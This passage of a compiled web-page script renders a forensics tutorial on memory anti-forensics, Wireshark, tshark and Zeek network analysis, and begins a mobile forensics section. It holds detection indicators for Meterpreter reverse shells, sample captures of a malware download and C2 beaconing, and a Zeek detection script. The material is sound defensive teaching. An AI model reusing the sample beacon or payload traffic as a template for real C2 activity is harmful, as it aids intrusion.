    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Indicators:\n- Reflective DLL loading artifacts\n- Named pipes: \\\\.\\pipe\\meterpreter_*\n- Stage encoding patterns\n- Reverse TCP/HTTPS connection to dynamic ports\n\nVolatility Commands:\n1. netscan → find reverse shell connections\n2. malfind → detect injected meterpreter DLL\n3. cmdline → show scripted payload execution\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "55-memory-forensics-challenges-and-anti-forensics",
      children: "5.5 Memory Forensics Challenges and Anti-Forensics"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Challenge"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Counter-Approach"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Process hollowing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware replaces memory of a legitimate process"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compare VAD with PE sections"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DKOM (Direct Kernel Object Manipulation)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rootkit removes process from kernel list"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use kdbgscan or psscan to find unlinked processes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DLL unloading"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware loads DLL then unloads to avoid detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Scan pagefile/swap for unloaded code"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "API hooking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware hooks system calls"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compare SSDT, IDT, IRP tables"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Memory scanning detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rootkit detects memory acquisition tools"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use hardware-assisted acquisition"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Full memory encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Some advanced malware encrypts its own memory"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Capture before encryption initializes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Large memory >64 GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Acquisition and analysis time increases"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use remote acquisition over 10 GbE"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RAM compression (Windows 8+)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pages may be compressed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Volatility handles decompression automatically"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "56-memory-forensics--complexity--performance",
      children: "5.6 Memory Forensics → Complexity & Performance"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Factor"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Impact"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Memory dump size"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4 GB RAM ≈ 4 GB file. Analysis time ≈ 10-30 minutes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Number of processes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Each additional process adds scan time"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Plugin complexity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "netscan is slower than pslist (more data structures)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SSD storage + 16 GB+ RAM recommended for analysis"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "YARA scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Can increase analysis time 2-5x depending on rule count"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "6-network-forensics",
      children: "6. Network Forensics"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " Security cameras at a bank record every person who enters and exits, what they carry, who they talk to, and how long they stay. Network forensics is reviewing those camera recordings (PCAP files) to reconstruct the intruder's path → when they entered, where they went, what data they took, and how they communicated with their accomplices outside."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "61-pcap-analysis-fundamentals",
      children: "6.1 PCAP Analysis Fundamentals"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key Network Forensic Artifacts:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Event Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Evidence Source"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Value"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DNS query"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DNS request/reply"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reveals C2 domain lookups, DGA activity"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "HTTP request"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HTTP GET/POST"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shows malware download URLs, exfiltrated data"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "TLS handshake"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Client Hello SNI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Identifies destination domain (even encrypted)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Email traffic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMTP/IMAP/POP3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing emails, data exfiltration"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "File transfer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FTP, SMB, HTTP download"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recover exfiltrated files"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Authentication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTLM, Kerberos, HTTP Basic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extract usernames, password hashes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Beaconing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Periodic TCP connections"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2 communication pattern"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "62-wireshark-analysis",
      children: "6.2 Wireshark Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "capturing-traffic",
      children: "Capturing Traffic"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Capture traffic on specific interface\nwireshark -i eth0 -k\n\n# OR from command line with tshark\ntshark -i eth0 -w capture.pcap -F pcapng\n\n# Capture with filter (reduce noise)\ntshark -i eth0 -w capture.pcap -f \"host 192.168.1.105\"\n\n# Capture with rotation (for long captures)\ntshark -i eth0 -w capture_%Y%m%d_%H%M.pcap -b filesize:102400 -b files:10\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "key-wireshark-display-filters",
      children: "Key Wireshark Display Filters"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Filter"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Purpose"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "http.request"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Show all HTTP requests"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "http.response.code == 200"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Successful HTTP downloads"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "dns.qry.name contains \".xyz\""
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Suspicious TLD lookups"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tcp.port == 445"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMB traffic (lateral movement)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "ip.src == 192.168.1.105"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Traffic from a specific IP"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tls.handshake.type == 1"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "TLS Client Hello messages"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "frame.time_delta > 1"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Packets with time gaps >1 second"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "data.data"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Raw application data"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "http.request.uri contains \"upload\""
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File upload URLs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "tcp.flags.syn == 1 and tcp.flags.ack == 0"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "TCP SYN (new connections)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "following-tcp-streams",
      children: "Following TCP Streams"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Wireshark GUI:\n# Right-click on TCP packet → Follow → TCP Stream\n\n# tshark: Extract TCP stream to file\ntshark -r capture.pcap -z follow,tcp,ascii,45 -q > stream_45.txt\n\n# Extract TCP stream raw bytes\ntshark -r capture.pcap -z follow,tcp,hex,45 -q\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Example TCP Stream → HTTP Download of Malware:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "GET /payload.exe HTTP/1.1\nHost: 185.234.72.18\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: */*\nConnection: Keep-Alive\n\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\nContent-Length: 342016\nDate: Sat, 15 Jun 2024 14:30:15 GMT\nServer: Apache/2.4.41 (Ubuntu)\n\nMZ.......................PE..L.....R...  [binary data = PE executable]\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "extracting-files-from-http-traffic",
      children: "Extracting Files from HTTP Traffic"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Using tshark to extract objects\ntshark -r capture.pcap --export-objects http,/evidence/carved/\n\n# Wireshark GUI:\n# File → Export Objects → HTTP → Select All → Save\n\n# Extract specific file by TCP stream\ntshark -r capture.pcap -z follow,tcp,raw,45 -q | tail -n +6 | xxd -r -p > extracted_payload.exe\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "detecting-malware-c2-with-wireshark",
      children: "Detecting Malware C2 with Wireshark"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "C2 Beaconing Indicators:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Regular intervals"
        }), " → malware checks in every X seconds/minute"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Same packet size"
        }), " → beacons often have identical structure"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Unusual ports"
        }), " → C2 on non-standard ports (8443, 8080, 4444)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "DGA domains"
        }), " → random-looking subdomains (.xyz, .top, .info)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "User-Agent anomalies"
        }), " → fake or outdated browser user agents"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Jitter patterns"
        }), " → intentional randomization to evade detection"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Find beaconing: count connections per destination IP\ntshark -r capture.pcap -T fields -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn\n\n# Example output:\n# 245 185.234.72.18 443   ← 245 connections to C2 server\n# 120 13.107.4.52   443   ← Windows Update (normal)\n# 89  8.8.8.8       53    ← DNS queries (normal)\n\n# Analyze connection timing (jitter analysis)\ntshark -r capture.pcap -Y \"ip.dst == 185.234.72.18\" -T fields -e frame.time_epoch > timestamps.txt\n# Calculate differences between consecutive timestamps\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "HTTP Beacon Example:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "GET /images/status.png HTTP/1.1\nHost: 185.234.72.18\nCookie: session=MTYyNzMwNDU2MA==\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The same request every 60 seconds with the same file, same cookie structure → this is a C2 beacon, not a real image download."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "63-zeek-bro-analysis",
      children: "6.3 Zeek (Bro) Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Zeek (formerly Bro) is a network security monitor that converts raw PCAP into structured logs."
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "log-generation",
      children: "Log Generation"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Analyze PCAP with Zeek\nzeek -r capture.pcap local\n\n# This generates multiple log files:\n# conn.log      → connection summaries\n# dns.log       → DNS queries/responses\n# http.log      → HTTP requests/responses\n# ssl.log       → TLS/SSL handshakes\n# ftp.log       → FTP sessions\n# smtp.log      → Email traffic\n# ssh.log       → SSH connections\n# files.log     → File extraction\n# notice.log    → Zeek-generated alerts\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "connlog-analysis",
      children: "conn.log Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "#separator \\x09\n#fields ts              uid           id.orig_h      id.orig_p  id.resp_h        id.resp_p  proto  service  duration   orig_bytes  resp_bytes  conn_state\n1141605291.123456  C1kqQZ...  192.168.1.105  49152      185.234.72.18    443        tcp    ssl     120.456   342016       5340        RSTO\n1141605295.234567  C2rqRZ...  192.168.1.105  49153      13.107.4.52      443        tcp    ssl     3.123     1024         20480       SF\n1141605300.345678  C3sqSZ...  192.168.1.105  49154      8.8.8.8          53         udp    dns     0.045     64           72          SF\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Analysis from conn.log:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Connection C1kqQZ to 185.234.72.18:443 has duration 120 seconds → long-lived connection"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "RSTO state means connection terminated by originator (not graceful close → malware self-terminated)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "High orig_bytes (342016) = file was sent to the server? Or payload was downloaded?"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Connection C2rqRZ is normal (short duration, SF = normal close)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "dnslog-analysis",
      children: "dns.log Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "#fields ts          uid       id.orig_h      id.resp_h    query                    qtype  qclass  rcode\n1141605300.456789  D4trSZ..  192.168.1.105  8.8.8.8      updates.download.windows.com  A     IN      0\n1141605310.567890  D5usTA..  192.168.1.105  8.8.8.8      abcdefgh123456.xyz           A     IN      3\n1141605320.678901  D6vtUB..  192.168.1.105  8.8.8.8      ijklmnop789012.xyz           A     IN      3\n1141605330.789012  D7wuUC..  192.168.1.105  8.8.8.8      qrstuvwx345678.xyz           A     IN      3\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Random-looking subdomains querying .xyz TLD → DGA (Domain Generation Algorithm)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "rcode = 3 means NXDOMAIN (domain doesn't resolve) → typical DGA behavior"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Queries every 10 seconds → beaconing"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "httplog-analysis",
      children: "http.log Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "#fields ts          uid       id.orig_h      id.resp_h     method  host             uri                   status  resp_mime_types           user_agent\n1141605305.234567  H8xvUD..  192.168.1.105  185.234.72.18  GET    185.234.72.18     /images/status.png     200     image/png                 Mozilla/5.0 (Windows NT 6.1; WOW64)\n1141605365.345678  H9ywVE..  192.168.1.105  185.234.72.18  GET    185.234.72.18     /images/status.png     200     image/png                 Mozilla/5.0 (Windows NT 6.1; WOW64)\n1141605425.456789  H0zxVF..  192.168.1.105  185.234.72.18  GET    185.234.72.18     /images/status.png     200     image/png                 Mozilla/5.0 (Windows NT 6.1; WOW64)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Same request every 60 seconds to the same URI"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "User-Agent: Windows NT 6.1 (Windows 7) but system is Windows 10 → fake UA"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Beacon interval: 60 seconds exactly (no jitter) → not human behavior"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "detecting-beaconing-with-zeek",
      children: "Detecting Beaconing with Zeek"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Extract beacon intervals from conn.log\nzeek-cut ts id.orig_h id.resp_h proto < conn.log | grep \"443\" | awk '{print $1}' > timestamps.txt\n\n# Analyze intervals with Python\npython3 -c \"\nimport sys\ntimes = [float(line.strip()) for line in open('timestamps.txt')]\nintervals = [times[i+1] - times[i] for i in range(len(times)-1)]\nprint(f'Count: {len(times)}')\nprint(f'Mean interval: {sum(intervals)/len(intervals):.2f}s')\nprint(f'Std dev: {(sum((i - sum(intervals)/len(intervals))**2 for i in intervals)/len(intervals))**0.5:.2f}s')\nprint(f'Min: {min(intervals):.2f}s, Max: {max(intervals):.2f}s')\n\"\n# Low standard deviation = beaconing\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "extracting-files-with-zeek",
      children: "Extracting Files with Zeek"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Zeek automatically extracts files to the files/ directory\n# files.log contains the mapping\n\n# Read files.log\nzeek-cut ts fuid tx_hosts rx_hosts mime_type filename < files.log\n\n# Reconstruct extracted files\nfor file in files/*; do\n    # Check file type\n    file \"$file\"\ndone\n\n# Hash extracted files for threat intelligence lookups\nsha256sum files/* | tee extracted_file_hashes.txt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "64-zeek-scripting-for-custom-detection",
      children: "6.4 Zeek Scripting for Custom Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-zeek",
        children: "# custom-c2-detection.zeek\nmodule CustomC2;\n\nexport {\n    redef enum Notice::Type += {\n        Periodic_HTTP_Beacon,\n        DGA_Domain,\n        Suspicious_UserAgent,\n        Data_Exfiltration\n    };\n}\n\nevent http_request(c: connection, method: string, original_uri: string,\n                   unescaped_uri: string, version: string)\n{\n    # Detect suspicious user agents\n    if ( c$http?$user_agent &&\n         c$http$user_agent == \"Mozilla/5.0 (Windows NT 6.1; WOW64)\" )\n    {\n        NOTICE([$note=Suspicious_UserAgent,\n                $msg=fmt(\"Suspicious UA from %s\", c$id$orig_h),\n                $conn=c]);\n    }\n}\n\n# Run: zeek -r capture.pcap custom-c2-detection.zeek\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "65-network-forensics--complexity-and-performance",
      children: "6.5 Network Forensics → Complexity and Performance"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Factor"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Impact"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PCAP file size"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1 GB PCAP ≈ 5-15 min processing in Wireshark"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Packet count"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10M+ packets requires CLI tools (tshark, zeek)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Zeek processing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~100 MB/min throughput on commodity hardware"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Storage for logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Zeek logs ≈ 5-10% of original PCAP size"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Analysis bottleneck"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Human review is the limiting factor"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h1, {
      id: "chapter-8-forensics--incident-response-2",
      children: "Chapter 8: Forensics & Incident Response"
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "7-mobile-forensics",
      children: "7. Mobile Forensics"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " Mobile phones are like a person's digital diary, map, camera, and phone book all in one device that's always with them. Mobile forensics is about reading that diary: who they called (call logs), where they went (GPS), who they texted (SMS/iMessage/WhatsApp), what they photographed (media files), and what apps they used."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "71-mobile-forensics-acquisition-types",
      children: "7.1 Mobile Forensics Acquisition Types"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Acquisition Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Data Retrieved"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Tool"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Time Required"
          })]
        })
